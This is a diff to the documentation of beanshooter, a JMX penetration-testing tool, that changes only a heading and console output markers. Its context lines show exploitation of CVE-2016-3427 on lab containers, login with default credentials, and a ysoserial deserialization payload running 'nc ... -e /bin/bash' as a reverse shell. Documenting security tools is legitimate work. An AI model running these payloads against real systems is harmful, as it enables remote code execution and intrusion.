@@ -1,4 +1,4 @@
-### Docker Container
+### Example Server
 
 ----
 
@@ -100,8 +100,8 @@ Running with the ``--ssl`` option, on the other hand, should work fine:
 ```console
 [pentester@kali ~]$ beanshooter --ssl 172.17.0.2 9010 status
 [+] Connecting to JMX server... 
-[/]    RMI object tries to connect to different remote host: iinsecure.dev
-[/]    Redirecting the connection back to 172.17.0.2... done!
+[*]    RMI object tries to connect to different remote host: iinsecure.dev
+[*]    Redirecting the connection back to 172.17.0.2... done!
 [+] Creating MBeanServerConnection... done!
 [+]
 [+] Getting Status of MLet... done!
@@ -239,8 +239,8 @@ The following example shows an successful attack on *CVE-2016-3427*:
 [+] cve-2016-3427 - Sending serialized Object as credential.
 [+]     An exception during the connection attempt is expected.
 [+] Connecting to JMX server...
-[/]    RMI object tries to connect to different remote host: iinsecure.dev
-[/]    Redirecting the connection back to 172.18.0.2... failed!
+[*]    RMI object tries to connect to different remote host: iinsecure.dev
+[*]    Redirecting the connection back to 172.18.0.2... failed!
 [*]
 [*] Caught SecurityException with content 'Authentication failed! Credentials should be String[] instead of java.util.HashSet'.
 [*]     Target is most likely vulnerable to cve-2016-3427.
@@ -262,8 +262,8 @@ Now you can spawn the shell with a second invocation:
 [+] cve-2016-3427 - Sending serialized Object as credential.
 [+]     An exception during the connection attempt is expected.
 [+] Connecting to JMX server... 
-[/]    RMI object tries to connect to different remote host: iinsecure.dev
-[/]    Redirecting the connection back to 172.18.0.2... failed!
+[*]    RMI object tries to connect to different remote host: iinsecure.dev
+[*]    Redirecting the connection back to 172.18.0.2... failed!
 [*]
 [*] Caught SecurityException with content 'Authentication failed! Credentials should be String[] instead of java.util.HashSet'.
 [*]     Target is most likely vulnerable to cve-2016-3427.
@@ -286,8 +286,8 @@ The response from a patched application server, on the other hand, looks like th
 [+] cve-2016-3427 - Sending serialized Object as credential.
 [+]     An exception during the connection attempt is expected.
 [+] Connecting to JMX server...
-[/]    RMI object tries to connect to different remote host: iinsecure.dev
-[/]    Redirecting the connection back to 172.18.0.2... failed!
+[*]    RMI object tries to connect to different remote host: iinsecure.dev
+[*]    Redirecting the connection back to 172.18.0.2... failed!
 [-] The following exception was thrown: java.lang.ClassCastException: Unsupported type: java.util.HashSet
 ```
 
@@ -298,8 +298,8 @@ The following example shows an authentication protected *JMX* endpoint that does
 ```console
 [pentester@kali ~]$ beanshooter --ssl --username controlRole --password control 172.18.0.2 9010 deployAll
 [+] Connecting to JMX server... 
-[/]    RMI object tries to connect to different remote host: iinsecure.dev
-[/]    Redirecting the connection back to 172.18.0.2... done!
+[*]    RMI object tries to connect to different remote host: iinsecure.dev
+[*]    Redirecting the connection back to 172.18.0.2... done!
 [+] Creating MBeanServerConnection... done!
 [+]
 [+] Creating MBean 'MLet' for remote deploymet... failed!
@@ -312,8 +312,8 @@ However, even if access to *MLet* is denied, serialization attacks can still wor
 [pentester@kali ~]$ beanshooter --ssl --username controlRole --password control 172.18.0.2 9010 ysoserial CommonsCollections6 "nc 172.18.0.1 4444 -e /bin/bash"
 [+] Creating ysoserial payload...done.
 [+] Connecting to JMX server... 
-[/]    RMI object tries to connect to different remote host: iinsecure.dev
-[/]    Redirecting the connection back to 172.18.0.2... done!
+[*]    RMI object tries to connect to different remote host: iinsecure.dev
+[*]    Redirecting the connection back to 172.18.0.2... done!
 [+] Creating MBeanServerConnection... done!
 [+]
 [+] Sending payload to 'getLoggerLevel'...
